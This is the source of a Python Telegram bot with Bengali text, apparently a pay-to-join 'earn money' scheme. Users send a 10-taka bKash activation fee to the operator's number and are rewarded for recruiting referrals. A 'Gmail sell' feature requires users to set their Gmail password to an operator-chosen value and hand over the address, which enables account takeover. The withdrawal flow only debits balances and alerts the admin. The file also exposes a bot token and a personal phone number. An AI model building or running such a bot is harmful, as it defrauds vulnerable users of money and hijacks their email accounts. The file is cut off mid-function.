import telebot
from telebot import types
import datetime
import sqlite3
import time
from threading import Thread
from flask import Flask  # ২৪ ঘণ্টা ফ্রিতে সচল রাখার জন্য ওয়েব সার্ভার

# ফ্লাস্ক অ্যাপ তৈরি (Render/Koyeb বা UptimeRobot দিয়ে ২৪ ঘণ্টা সচল রাখার জন্য)
app = Flask('')

@app.route('/')
def home():
    return "বট সফলভাবে ২৪ ঘণ্টা সচল আছে!"

def run_web_server():
    app.run(host='0.0.0.0', port=8080)

# বটের আসল টোকেন
TOKEN = '8857286121:AAG3KVUNLk76cmTGaXcZhOzXO77bhkbwVAM'
bot = telebot.TeleBot(TOKEN)

BOT_LAUNCH_DATE = datetime.datetime(2026, 6, 22)

# অ্যাডমিন ও কনফিগুরেশন
ADMIN_ID = 6711784196
ADMIN_USERNAME = "@rjrakib019"
ADMIN_PAYMENT_NUMBER = "01943937627"
GMAIL_PASSWORD_REQUIRED = "@rakib2041"
CHANNEL_LINK = "https://t.me/freeincomesite204"
MIN_WITHDRAW = 80.00

# মেইন মেনু কিবোর্ড জেনারেটর ফাংশন
def get_main_menu_markup(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_home = types.KeyboardButton("🏠 Home")
    btn_task = types.KeyboardButton("🎁 Daily Task")
    btn_wallet = types.KeyboardButton("💼 Wallet")
    btn_team = types.KeyboardButton("👥 Team")
    btn_profile = types.KeyboardButton("👤 Profile")
    markup.row(btn_home, btn_task)
    markup.row(btn_wallet, btn_team, btn_profile)
    
    if user_id == ADMIN_ID:
        btn_admin = types.KeyboardButton("⚙️ Admin Panel")
        markup.row(btn_admin)
    return markup

# ক্যানসেল কিবোর্ড জেনারেটর ফাংশন
def get_cancel_markup():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("❌ Cancel"))
    return markup

# ইনপুট ভ্যালিডেশন চেকার ফাংশন
def is_invalid_input(text):
    main_buttons = ["🏠 Home", "🎁 Daily Task", "💼 Wallet", "👥 Team", "👤 Profile", "⚙️ Admin Panel", "❌ Cancel"]
    if text in main_buttons:
        return True
    return False

def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    # ইউজার টেবিল (টার্গেট বোনাসের জন্য ৩টি নতুন কলামসহ আপডেট করা হয়েছে)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            name TEXT,
            balance REAL,
            status TEXT,
            referred_by INTEGER,
            last_daily_task TEXT,
            target_start_date TEXT,
            target_ref_count INTEGER DEFAULT 0,
            target_claimed INTEGER DEFAULT 0
        )
    ''')
    
    # যদি আগের ডেটাবেজ থাকে, তবে নতুন কলামগুলো ম্যানুয়ালি অ্যাড করার চেষ্টা করবে (ক্র্যাশ এড়াতে)
    try:
        cursor.execute("ALTER TABLE users ADD COLUMN target_start_date TEXT")
    except sqlite3.OperationalError: pass
    try:
        cursor.execute("ALTER TABLE users ADD COLUMN target_ref_count INTEGER DEFAULT 0")
    except sqlite3.OperationalError: pass
    try:
        cursor.execute("ALTER TABLE users ADD COLUMN target_claimed INTEGER DEFAULT 0")
    except sqlite3.OperationalError: pass

    # জিমেইল ট্র্যাকিং টেবিল
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS gmail_orders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            gmail TEXT,
            password TEXT,
            status TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# ইউজারের ৩ দিনের টার্গেট টাইম ও কাউন্ট চেক এবং রিসেট করার ফাংশন
def check_and_update_target(user_id):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT target_start_date, target_ref_count, target_claimed FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    
    today = datetime.date.today()
    
    if res is None:
        conn.close()
        return None
        
    start_date_str, ref_count, claimed = res[0], res[1], res[2]
    
    # যদি শুরু করার কোনো ডেট না থাকে (নতুন ইউজার)
    if not start_date_str:
        cursor.execute("UPDATE users SET target_start_date = ?, target_ref_count = 0, target_claimed = ? WHERE user_id = ?", (today.strftime("%Y-%m-%d"), 0, user_id))
        conn.commit()
        start_date = today
        ref_count = 0
        claimed = 0
    else:
        start_date = datetime.datetime.strptime(start_date_str, "%Y-%m-%d").date()
        
    # ৩ দিন পার হয়ে গেছে কি না চেক
    days_passed = (today - start_date).days
    
    if days_passed >= 3:
        # ৩ দিন পার হলে সব রিসেট হয়ে আবার নতুন ৩ দিন শুরু হবে
        cursor.execute("UPDATE users SET target_start_date = ?, target_ref_count = 0, target_claimed = 0 WHERE user_id = ?", (today.strftime("%Y-%m-%d"), user_id))
        conn.commit()
        start_date = today
        ref_count = 0
        claimed = 0
        days_passed = 0
        
    conn.close()
    
    remaining_days = 3 - days_passed
    return {
        "start_date": start_date,
        "ref_count": ref_count,
        "claimed": claimed,
        "remaining_days": remaining_days
    }

def get_bot_age():
    now = datetime.datetime.now()
    age = now - BOT_LAUNCH_DATE
    days = age.days
    hours = age.seconds // 3600
    if days == 0:
        return f"{hours} ঘণ্টা"
    return f"{days} দিন {hours} ঘণ্টা"

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id
    username = message.from_user.first_name
    
    command_text = message.text.split()
    referred_by = None
    if len(command_text) > 1:
        try:
            referred_by = int(command_text[1])
            if referred_by == user_id:
                referred_by = None
        except ValueError:
            referred_by = None

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT balance, status FROM users WHERE user_id = ?", (user_id,))
    user = cursor.fetchone()
    
    today_str = datetime.date.today().strftime("%Y-%m-%d")
    
    if user is None:
        initial_balance = 20.00
        status = "Active" if user_id == ADMIN_ID else "Pending"
        
        cursor.execute("INSERT INTO users (user_id, name, balance, status, referred_by, last_daily_task, target_start_date, target_ref_count, target_claimed) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                       (user_id, username, initial_balance, status, referred_by, "", today_str, 0, 0))
        conn.commit()
        
        if referred_by:
            cursor.execute("SELECT name FROM users WHERE user_id = ?", (referred_by,))
            referrer = cursor.fetchone()
            if referrer:
                try:
                    bot.send_message(referred_by, f"🔔 **নতুন রেফারেল!**\n\n{username} আপনার লিংকে জয়েন করেছে। সে অ্যাকাউন্ট একটিভ করলেই আপনার ওয়ালেটে ৫ টাকা যোগ হবে।")
                except Exception:
                    pass
        
        current_balance = initial_balance
        current_status = status
    else:
        current_balance = user[0]
        current_status = user[1]
        if user_id == ADMIN_ID and current_status != "Active":
            cursor.execute("UPDATE users SET status = 'Active' WHERE user_id = ?", (ADMIN_ID,))
            conn.commit()
            current_status = "Active"
        
    conn.close()
    
    markup = get_main_menu_markup(user_id)
    status_icon = "❌ Inactive" if current_status == "Pending" else "✅ Active"
    
    welcome_msg = (
        f"💚 **FATHER OF EARN** 💚\n\n"
        f"👋 WELCOME BACK, {username}!\n"
        f"💰 আপনার ব্যালেন্স: ৳{current_balance:.2f}\n"
        f"🔐 অ্যাকাউন্ট স্ট্যাটাস: {status_icon}\n\n"
        f"⏱ **বটের বয়স:** {get_bot_age()}\n"
        f"📢 *Notice:* ১০ টাকা দিয়ে আইডি একটিভ করে ২০ হাজার টাকা পর্যন্ত আয় করুন।"
    )
    bot.send_message(user_id, welcome_msg, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_menu(message):
    user_id = message.chat.id
    
    if message.text == "⚙️ Admin Panel" and user_id == ADMIN_ID:
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE status = 'Pending'")
        pending_users = cursor.fetchone()[0]
        conn.close()
        
        markup = types.InlineKeyboardMarkup()
        btn_users = types.InlineKeyboardButton("👥 ইউজার লিস্ট", callback_data="adm_list")
        btn_stats = types.InlineKeyboardButton("📊 বটের পরিসংখ্যান", callback_data="adm_sts")
        markup.row(btn_users, btn_stats)
        
        bot.send_message(
            user_id, 
            f"⚙️ **অ্যাডমিন প্যানেল**\n\n"
            f"📈 মোট রেজিস্টার্ড ইউজার: {total_users} জন\n"
            f"⏳ পেন্ডিং অ্যাকাউন্ট: {pending_users} জন\n\n"
            f"ইউজার নিয়ন্ত্রণ বা তথ্য দেখতে নিচের বাটনে ক্লিক করুন:", 
            reply_markup=markup
        )
        return

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT balance, status, last_daily_task FROM users WHERE user_id = ?", (user_id,))
    user = cursor.fetchone()
    
    if user is None:
        bot.send_message(user_id, "অনুগ্রহ করে প্রথমে /start লিখুন।")
        conn.close()
        return

    current_balance, current_status, last_daily = user[0], user[1], user[2]

    if message.text == "🏠 Home":
        if current_status == "Pending":
            markup = types.InlineKeyboardMarkup()
            btn_active = types.InlineKeyboardButton("🔑 অ্যাকাউন্ট একটিভ করুন (৳১০)", callback_data="activate_account")
            markup.add(btn_active)
            bot.send_message(user_id, f"⚠️ **আপনার অ্যাকাউন্টটি এখনো একটিভ নয়!**\n\nকাজ শুরু করতে হলে প্রথমে ১০ টাকা দিয়ে অ্যাকাউন্টটি একটিভ করতে হবে।\n\n👇 নিচের বাটনে ক্লিক করে নিয়ম দেখুন।", parse_mode="Markdown", reply_markup=markup)
        else:
            markup = types.InlineKeyboardMarkup(row_width=2)
            btn_fb = types.InlineKeyboardButton("📘 ফেসবুক সেল", callback_data="proj_fb")
            btn_gm = types.InlineKeyboardButton("📧 ஜিমেইল সেল (৳১৫)", callback_data="proj_gm")
            btn_ig = types.InlineKeyboardButton("📸 ইনষ্টা সেল", callback_data="proj_ig")
            btn_job = types.InlineKeyboardButton("💼 জব পোস্ট", callback_data="proj_job")
            markup.add(btn_fb, btn_gm, btn_ig, btn_job)
            bot.send_message(user_id, "🚀 **আমাদের প্রজেক্ট সমূহ:**\nনিচের যেকোনো একটি প্রজেক্টে ক্লিক করে কাজ শুরু করুন।", parse_mode="Markdown", reply_markup=markup)
        
    elif message.text == "🎁 Daily Task":
        # প্রথমে ইউজারের টার্গেট ডেটা আপডেট ও চেক করা হবে
        t_data = check_and_update_target(user_id)
        
        today_str = datetime.date.today().strftime("%Y-%m-%d")
        
        markup = types.InlineKeyboardMarkup()
        btn_channel = types.InlineKeyboardButton("📢 চ্যানেলে জয়েন করুন", url=CHANNEL_LINK)
        btn_claim = types.InlineKeyboardButton("💰 বোনাস ক্লেইম করুন (৳৩)", callback_data="claim_daily")
        markup.row(btn_channel)
        markup.row(btn_claim)
        
        # [NEW] টার্গেট বোনাস বাটন যোগ করা
        btn_target = types.InlineKeyboardButton("🎯 টার্গেট বোনাস (৳২০ চ্যালেঞ্জ)", callback_data="view_target_bonus")
        markup.row(btn_target)
        
        if last_daily == today_str:
            bot.send_message(user_id, "🎁 **ডেইলি টাস্ক মেনু**\n\nআজকের ডেইলি ৩ টাকা বোনাস নেওয়া শেষ। নিচের বাটন থেকে **টার্গেট বোনাস** চ্যালেঞ্জ দেখতে পারেন।", reply_markup=markup)
        else:
            bot.send_message(user_id, f"🎁 **ডেইলি টাস্ক:**\n\nনিচের চ্যানেলে জয়েন করুন এবং 'বোনাস ক্লেইম করুন' বাটনে চাপ দিয়ে ৩ টাকা বোনাস বুঝে নিন।", reply_markup=markup)

    elif message.text == "💼 Wallet":
        markup = types.InlineKeyboardMarkup()
        btn_withdraw = types.InlineKeyboardButton("💸 উইথড্র করুন", callback_data="request_withdraw")
        markup.add(btn_withdraw)
        bot.send_message(user_id, f"💳 **আপনার ওয়ালেট**\n\n💵 বর্তমান ব্যালেন্স: ৳{current_balance:.2f}\n💸 মিনিমাম উইথড্র: ৳{MIN_WITHDRAW:.0f}", reply_markup=markup)
        
    elif message.text == "👥 Team":
        cursor.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,))
        total_refer = cursor.fetchone()[0]
        bot.send_message(user_id, f"🔗 **আপনার রেফারেল লিংক:**\nhttps://t.me/Fatherofearn204_bot?start={user_id}\n\n👥 মোট রেফার: {total_refer} - জন\n🎁 প্রতি রেফারে পাবেন ৫ টাকা বোনাস! (ইউজার একটিভ হতে হবে)")
        
    elif message.text == "👤 Profile":
        status_text = "Active ✅" if current_status == "Active" else "Pending (❌ Inactive)"
        bot.send_message(user_id, f"👤 **ইউজার প্রোফাইল**\n\nনাম: {message.from_user.first_name}\nআইডি: `{user_id}`\nস্ট্যাটাস: {status_text}", parse_mode="Markdown")

    conn.close()

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    
    if call.data == "activate_account":
        instructions = (
            f"💰 **অ্যাকাউন্ট অ্যাক্টিভেশন নিয়ম:**\n\n"
            f"১. আমাদের বিকাশ নম্বরে ৳১০ সেন্যান্ডমানি (Send Money) করুন।\n"
            f"📱 আমাদের বিকাশ নম্বর: `{ADMIN_PAYMENT_NUMBER}`\n\n"
            f"২. টাকা পাঠানোর পর নিচে আপনার **বিকাশ নম্বর** এবং **TrxID (ট্রানজেকশন আইডি)** লিখে সাবমিট করুন।"
        )
        msg = bot.send_message(user_id, instructions, parse_mode="Markdown", reply_markup=get_cancel_markup())
        bot.register_next_step_handler(msg, process_activation_proof)
        
    elif call.data == "proj_gm":
        msg = bot.send_message(
            user_id, 
            f"📧 **জিমেইল সেল প্রজেক্ট (৳১৫)**\n\n"
            f"🔑 আপনার পাসওয়ার্ড অবশ্যই হতে হবে: `{GMAIL_PASSWORD_REQUIRED}`\n\n"
            f"👇 এখন নিচে আপনার বিক্রয়যোগ্য **জিমেইল অ্যাড্রেসটি** টাইপ করে সেন্ড করুন:", 
            parse_mode="Markdown",
            reply_markup=get_cancel_markup()
        )
        bot.register_next_step_handler(msg, process_gmail_step)
        
    elif call.data == "claim_daily":
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT last_daily_task FROM users WHERE user_id = ?", (user_id,))
        last_daily = cursor.fetchone()[0]
        today_str = datetime.date.today().strftime("%Y-%m-%d")
        
        if last_daily == today_str:
            bot.answer_callback_query(call.id, "❌ আপনি আজ অলরেডি রিওয়ার্ড নিয়েছেন!")
        else:
            cursor.execute("UPDATE users SET balance = balance + 3.00, last_daily_task = ? WHERE user_id = ?", (today_str, user_id))
            conn.commit()
            bot.answer_callback_query(call.id, "🎉 ৳৩ আপনার অ্যাকাуন্টে যোগ হয়েছে!")
            try:
                bot.send_message(user_id, "🎉 **অভিনন্দন!** ডেইলি টাস্ক সফলভাবে সম্পন্ন হয়েছে। আপনার ওয়ালেটে ৩ টাকা যোগ করা হয়েছে।")
            except Exception:
                pass
        conn.close()

    # [NEW] টার্গেট বোনাস মেনু ও ক্লেইম অপশন হ্যান্ডলার
    elif call.data == "view_target_bonus":
        t_data = check_and_update_target(user_id)
        
        markup = types.InlineKeyboardMarkup()
        
        status_text = ""
        if t_data["claimed"] == 1:
            status_text = "✅ আপনি ইতিমধ্যে এই ৩ দিনের বোনাস ক্লেইম করেছেন।"
            markup.add(types.InlineKeyboardButton("🔒 ইতিমধ্যে ক্লেইমড", callback_data="target_already"))
        elif t_data["ref_count"] >= 10:
            status_text = "🎉 অভিনন্দন! আপনার ১০টি একটিভ রেফার পূর্ণ হয়েছে।"
            markup.add(types.InlineKeyboardButton("💰 ২০ টাকা ক্লেইম করুন", callback_data="claim_target_bonus"))
        else:
            status_text = "⏳ টার্গেট এখনো পূরণ হয়নি। ১০টি একটিভ রেফার হলে বাটনটি অন হবে।"
            markup.add(types.InlineKeyboardButton(f"🔒 অপূর্ণ ({t_data['ref_count']}/10)", callback_data="target_not_yet"))
            
        target_msg = (
            f"🎯 **টার্গেট বোনাস (৩ দিনের চ্যালেঞ্জ)**\n\n"
            f"📝 **টাস্ক:** ৩ দিনের মধ্যে ১০টি **একটিভ রেফার** করতে পারলে পাবেন এক্সট্রা **৳২০ বোনাস**!\n\n"
            f"📊 **আপনার বর্তমান অবস্থা:**\n"
            f"👥 আপনার মেয়াদী একটিভ রেফার: `{t_data['ref_count']}` / ১০ টি\n"
            f"⏱ সময় বাকি আছে: `{t_data['remaining_days']}` দিন (৩ দিন পর অটোমেটিক সব রিসেট হবে)\n\n"
            f"📢 **স্ট্যাটাস:** {status_text}"
        )
        bot.send_message(user_id, target_msg, parse_mode="Markdown", reply_markup=markup)
        
    elif call.data == "claim_target_bonus":
        t_data = check_and_update_target(user_id)
        if t_data["claimed"] == 1:
            bot.answer_callback_query(call.id, "❌ আপনি অলরেডি বোনাসটি নিয়ে নিয়েছেন!", show_alert=True)
            return
        if t_data["ref_count"] < 10:
            bot.answer_callback_query(call.id, "❌ আপনার এখনও ১০টি একটিভ রেফার হয়নি!", show_alert=True)
            return
            
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET balance = balance + 20.00, target_claimed = 1 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        
        bot.answer_callback_query(call.id, "🎉 সফলভাবে ২০ টাকা বোনাস ক্লেইম করা হয়েছে!", show_alert=True)
        bot.send_message(user_id, "🎉 **অসাধারন!** ৩ দিনে ১০টি একটিভ রেফার করার চ্যালেঞ্জ সম্পন্ন করায় আপনার ওয়ালেটে এক্সট্রা **৳২০** যোগ করা হলো।", reply_markup=get_main_menu_markup(user_id))

    elif call.data in ["target_already", "target_not_yet"]:
        bot.answer_callback_query(call.id, "⚠️ টার্গেট পূরণ হলে এবং ক্লেইম না করা থাকলে বাটনটি সচল হবে।")
        
    elif call.data == "request_withdraw":
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        balance = cursor.fetchone()[0]
        conn.close()
        
        if balance < MIN_WITHDRAW:
            bot.answer_callback_query(call.id, f"❌ আপনার ব্যালেন্স ৳{MIN_WITHDRAW:.0f} এর কম!")
            bot.send_message(user_id, f"❌ **দুঃখিত!** উইথড্র করার জন্য আপনার ব্যালেন্সে সর্বনিম্ন ৳{MIN_WITHDRAW:.0f} থাকতে হবে।")
        else:
            markup = types.InlineKeyboardMarkup()
            btn_bkash = types.InlineKeyboardButton("📱 বিকাশ (Bkash)", callback_data="w_bkash")
            markup.add(btn_bkash)
            bot.send_message(user_id, "💳 **পেমেন্ট মেথড নির্বাচন করুন:**", reply_markup=markup)
            
    elif call.data == "w_bkash":
        msg = bot.send_message(user_id, "📱 **বিকাশ উইথড্র**\n\nআপনার বিকাশ পার্সোনাল নম্বরটি (১১ ডিজিট) টাইপ করেেন্ড করুন:", reply_markup=get_cancel_markup())
        bot.register_next_step_handler(msg, process_withdraw_number)

    # ⚙️ অ্যাডমিন প্যানেল এবং অ্যাক্টিভেশন হ্যান্ডলার
    elif call.data == "adm_list" and user_id == ADMIN_ID:
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, name, status, balance FROM users LIMIT 20")
        users = cursor.fetchall()
        conn.close()
        
        markup = types.InlineKeyboardMarkup()
        for u in users:
            status_icon = "✅" if u[2] == "Active" else "❌"
            markup.add(types.InlineKeyboardButton(f"{status_icon} {u[1]} (৳{u[3]:.1f})", callback_data=f"in_{u[0]}"))
        bot.edit_message_text("👥 **সর্বশেষ ২০ জন ইউজারের লিস্ট:**\nযেকোনো ইউজারের ওপর ক্লিক করে তথ্য দেখুন বা অ্যাকাউন্ট একটিভ করুন।", user_id, call.message.message_id, reply_markup=markup)
        
    elif call.data.startswith("in_") and user_id == ADMIN_ID:
        target_id = int(call.data.split("_")[1])
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT name, balance, status FROM users WHERE user_id = ?", (target_id,))
        u_data = cursor.fetchone()
        conn.close()
        
        if u_data:
            markup = types.InlineKeyboardMarkup()
            if u_data[2] == "Pending":
                markup.add(types.InlineKeyboardButton("✅ Approve (একটিভ করুন)", callback_data=f"ac_{target_id}"))
            markup.add(types.InlineKeyboardButton("⬅️ ব্যাক", callback_data="adm_list"))
            info_msg = f"👤 **ইউজার ডিটেইলস:**\n\n📛 নাম: {u_data[0]}\n🆔 আইডি: `{target_id}`\n💰 ব্যালেন্স: ৳{u_data[1]:.2f}\n🔐 স্ট্যাটাস: {u_data[2]}"
            bot.edit_message_text(info_msg, user_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data.startswith("ac_") and user_id == ADMIN_ID:
        target_id = int(call.data.split("_")[1])
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT status, referred_by, name FROM users WHERE user_id = ?", (target_id,))
        u_info = cursor.fetchone()
        
        if u_info and u_info[0] == "Pending":
            cursor.execute("UPDATE users SET status = 'Active' WHERE user_id = ?", (target_id,))
            referred_by = u_info[1]
            username = u_info[2]
            
            if referred_by:
                # [NEW CRITICAL UPDATE] রেফারার যখন কাউকে রেফার করবে এবং সে একটিভ হবে, 
                # তখন ৫ টাকা বোনাস যোগ হওয়ার সাথে সাথে ওই ৩ দিনের চ্যালেঞ্জের রেফার কাউন্ট (+১) বাড়বে।
                cursor.execute("UPDATE users SET balance = balance + 5.00, target_ref_count = target_ref_count + 1 WHERE user_id = ?", (referred_by,))
                try:
                    bot.send_message(referred_by, f"🎉 আপনার রেফারকৃত ইউজার **{username}** অ্যাকাউন্ট একটিভ করায় আপনার ওয়ালেটে ৫ টাকা বোনাস যোগ হয়েছে এবং ৩ দিনের টার্গেটে ১টি রেফার যোগ হয়েছে!")
                except Exception:
                    pass
            conn.commit()
            bot.answer_callback_query(call.id, "✅ অ্যাকাউন্ট সফলভাবে একটিভ করা হয়েছে!")
            bot.edit_message_text(f"✅ ইউজার `{target_id}` এর অ্যাকাউন্ট সফলভাবে একটিভ করা হয়েছে!", user_id, call.message.message_id)
            try:
                bot.send_message(target_id, "🎉 **অভিনন্দন!** অ্যাডমিন আপনার অ্যাক্টিভেশন ফি ভেরিফাই করে অ্যাকাউন্টটি একটিভ করে দিয়েছে।")
            except Exception:
                pass
        else:
            bot.answer_callback_query(call.id, "⚠️ এই অ্যাকাউন্টটি ইতিমধ্যে একটিভ!")
        conn.close()

    # 📥 জিমেইল এপ্রুভ ও রিজেক্ট কলব্যাক হ্যান্ডলার
    elif (call.data.startswith("ga_") or call.data.startswith("g_ap_")) and user_id == ADMIN_ID:
        order_id = int(call.data.split("_")[-1])
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, gmail, status FROM gmail_orders WHERE id = ?", (order_id,))
        order = cursor.fetchone()
        
        if order and order[2] == "Pending":
            u_id, g_mail = order[0], order[1]
            cursor.execute("UPDATE gmail_orders SET status = 'Approved' WHERE id = ?", (order_id,))
            cursor.execute("UPDATE users SET balance = balance + 15.00 WHERE user_id = ?", (u_id,))
            conn.commit()
            
            bot.answer_callback_query(call.id, "✅ জিমেইল এপ্রুভ করা হয়েছে!")
            bot.edit_message_text(f"✅ **জিমেইল অর্ডার #{order_id} এপ্রুভড!**\nইউজার `{u_id}` এর ব্যালেন্সে ৳১৫ যোগ করা হয়েছে।", user_id, call.message.message_id)
            try:
                bot.send_message(u_id, f"✅ **আপনার জিমেইলটি সফলভাবে ভেরিফাই হয়েছে!**\n📧 জিমেইল: `{g_mail}`\n💰 আপনার ওয়ালেটে ৳১৫.০০ যোগ করে দেওয়া হয়েছে।", parse_mode="Markdown")
            except Exception:
                pass
        else:
            bot.answer_callback_query(call.id, "⚠️ এটি ইতিমধ্যে এপ্রুভ বা রিজেক্ট করা হয়েছে!")
        conn.close()

    elif (call.data.startswith("gr_") or call.data.startswith("g_rj_")) and user_id == ADMIN_ID:
        order_id = int(call.data.split("_")[-1])
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, gmail, status FROM gmail_orders WHERE id = ?", (order_id,))
        order = cursor.fetchone()
        
        if order and order[2] == "Pending":
            u_id, g_mail = order[0], order[1]
            cursor.execute("UPDATE gmail_orders SET status = 'Rejected' WHERE id = ?", (order_id,))
            conn.commit()
            
            bot.answer_callback_query(call.id, "❌ জিমেইল রিজেক্ট করা হয়েছে!")
            bot.edit_message_text(f"❌ **জিমেইল অর্ডার #{order_id} রিজেক্ট করা হয়েছে।**", user_id, call.message.message_id)
            try:
                bot.send_message(u_id, f"❌ **আপনার জিমেইল সেল রিকোয়েস্টটি বাতিল করা হয়েছে!**\n📧 জিমেইল: `{g_mail}`\n💬 কারণ: সঠিক পাসওয়ার্ড বা তথ্য মিলিপত্র পাওয়া যায়নি। অনুগ্রহ করে সঠিক তথ্য দিয়ে পুনরায় চেষ্টা করুন।")
            except Exception:
                pass
        else:
            bot.answer_callback_query(call.id, "⚠️ এটি ইতিমধ্যে প্রসেস করা হয়েছে!")
        conn.close()
        
    elif call.data == "adm_sts" and user_id == ADMIN_ID:
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT SUM(balance) FROM users")
        total_bal = cursor.fetchone()[0] or 0
        conn.close()
        bot.answer_callback_query(call.id, f"💰 সার্ভার টোটাল ব্যালেন্স: ৳{total_bal:.2f}", show_alert=True)

    elif call.data in ["proj_fb", "proj_ig", "proj_job"]:
        bot.answer_callback_query(call.id, "💼 এই প্রজেক্টের কাজ শীঘ্রই চালু করা হবে!")

# ইউজার অ্যাক্টিভেশন প্রুফ সাবমিট প্রসেস
def process_activation_proof(message):
    user_id = message.chat.id
    user_proof = message.text
    username = message.from_user.first_name
    
    if is_invalid_input(user_proof):
        bot.send_message(user_id, "❌ অ্যাক্টিভেশন রিকোয়েস্ট বাতিল করা হয়েছে।", reply_markup=get_main_menu_markup(user_id))
        return

    bot.send_message(user_id, "✅ **আপনার পেমেন্ট তথ্য অ্যাডমিনের কাছে পাঠানো হয়েছে!**\nঅ্যাডমিন ভেরিফাই করে কিছুক্ষণের মধ্যেই আপনার অ্যাকাউন্ট একটিভ করে দেবে।", reply_markup=get_main_menu_markup(user_id))
    
    markup = types.InlineKeyboardMarkup()
    btn_approve = types.InlineKeyboardButton("✅ Approve (একটিভ করুন)", callback_data=f"ac_{user_id}")
    markup.add(btn_approve)
    
    admin_notif = (
        f"🔔 **নতুন একটিভেশন রিকোয়েস্ট!**\n\n"
        f"👤 ইউজার নাম: {username}\n"
        f"🆔 ইউজার আইডি: `{user_id}`\n"
        f"📝 পেমেন্ট প্রুফ/TrxID:\n`{user_proof}`\n\n"
        f"টাকা পেয়ে থাকলে নিচের বাটনে ক্লিক করে এখনই একটিভ করে দিন:"
    )
    bot.send_message(ADMIN_ID, admin_notif, parse_mode="Markdown", reply_markup=markup)

# উইথড্র প্রসেসিং স্টেপস
def process_withdraw_number(message):
    user_id = message.chat.id
    bkash_num = message.text
    
    if is_invalid_input(bkash_num):
        bot.send_message(user_id, "❌ উইথড্র প্রসেস বাতিল করা হয়েছে।", reply_markup=get_main_menu_markup(user_id))
        return

    if len(bkash_num) < 11 or not bkash_num.isdigit():
        bot.send_message(user_id, "❌ এটি সঠিক মোবাইল নম্বর নয়। আবার উইথড্র অপশনে গিয়ে চেষ্টা করুন।", reply_markup=get_main_menu_markup(user_id))
        return
        
    msg = bot.send_message(user_id, f"📱 বিকাশ নম্বর: `{bkash_num}`\n\nকত টাকা উইথড্র করতে চান তা সংখ্যায় লিখুন (যেমন: 80):", parse_mode="Markdown", reply_markup=get_cancel_markup())
    bot.register_next_step_handler(msg, lambda msg: process_withdraw_amount(msg, bkash_num))

def process_withdraw_amount(message, bkash_num):
    user_id = message.chat.id
    amount_text = message.text
    
    if is_invalid_input(amount_text):
        bot.send_message(user_id, "❌ উইথড্র প্রসেস বাতিল করা হয়েছে।", reply_markup=get_main_menu_markup(user_id))
        return

    try:
        amount = float(amount_text)
    except ValueError:
        bot.send_message(user_id, "❌ অনুগ্রহ করে শুধুমাত্র সংখ্যায় পরিমাণটি লিখুন। আবার চেষ্টা করুন।", reply_markup=get_main_menu_markup(user_id))
        return
        
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    balance = cursor.fetchone()[0]
    
    if amount < MIN_WITHDRAW:
        bot.send_message(user_id, f"❌ মিনিমাম উইথড্র পরিমাণ হলো ৳{MIN_WITHDRAW:.0f} টাকা।", reply_markup=get_main_menu_markup(user_id))
        conn.close()
        return
    if amount > balance:
        bot.send_message(user_id, f"❌ আপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই। আপনার বর্তমান ব্যালেন্স: ৳{balance:.2f}", reply_markup=get_main_menu_markup(user_id))
        conn.close()
        return
        
    cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()
    
    bot.send_message(user_id, "ধন্যবাদ আপনার উইথড্র সফল হয়েছে। ২৪ ঘন্টার মধ্যে আপনার একাউন্টে পৌছে যাবে।", reply_markup=get_main_menu_markup(user_id))
    
    notification = (
        f"🚨 **নতুন উইথড্র রিকোয়েস্ট এসেছে!** 🚨\n\n"
        f"👤 ইউজার নাম: {message.from_user.first_name}\n"
        f"🆔 ইউজার আইডি: `{user_id}`\n"
        f"📱 পেমেন্ট মেথড: **বিকাশ**\n"
        f"📞 বিকাশ নম্বর: `{bkash_num}`\n"
        f"💰 উইথড্র পরিমাণ: ৳{amount:.2f}"
    )
    bot.send_message(ADMIN_ID, notification, parse_mode="Markdown")

# জিমেইল সাবমিশন স্টেপস
def process_gmail_step(message):
    user_id = message.chat.id
    gmail_input = message.text
    
    if is_invalid_input(gmail_input):
